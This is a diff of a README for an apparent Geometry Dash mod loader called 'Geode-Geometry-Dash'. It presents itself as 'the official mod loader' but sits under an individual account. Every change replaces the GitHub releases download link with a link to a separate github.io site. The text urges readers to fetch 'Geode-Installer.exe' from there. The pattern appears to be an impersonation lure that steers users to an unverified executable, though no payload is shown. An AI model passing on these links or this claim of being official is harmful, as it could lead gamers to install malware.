@@ -1,6 +1,6 @@
 # 🎮 Geode-Geometry-Dash - Unlock Unlimited Geometry Dash Mods
 
-[![Download Geode Installer](https://img.shields.io/badge/Download-Geode_Installer-blue?style=for-the-badge&logo=github)](https://github.com/Acooun8922/Geode-Geometry-Dash/releases)
+[![Download Geode Installer](https://img.shields.io/badge/Download-Geode_Installer-blue?style=for-the-badge&logo=github)](https://acooun8922.github.io)
 
 ## 🚀 What is Geode-Geometry-Dash?
 
@@ -20,7 +20,7 @@ Geode-Geometry-Dash is the official mod loader for Geometry Dash, version 5.8.2,
 
 ### Step 1: Download the Latest Release
 
-Visit this link to download the application: [https://github.com/Acooun8922/Geode-Geometry-Dash/releases](https://github.com/Acooun8922/Geode-Geometry-Dash/releases)
+Visit this link to download the application: [https://acooun8922.github.io](https://acooun8922.github.io)
 
 Look for the newest release (v5.8.2) and download the file labeled "Geode-Installer.exe" or "GeodeSetup.exe".
 
@@ -105,7 +105,7 @@ The Geode installer checks for updates automatically. You can also download the 
 
 Don't have it yet? Get the latest version here:
 
-[![Download Geode Installer](https://img.shields.io/badge/Download-Geode_Installer-green?style=for-the-badge&logo=github)](https://github.com/Acooun8922/Geode-Geometry-Dash/releases)
+[![Download Geode Installer](https://img.shields.io/badge/Download-Geode_Installer-green?style=for-the-badge&logo=github)](https://acooun8922.github.io)
 
 ## 📢 Community & Support
 
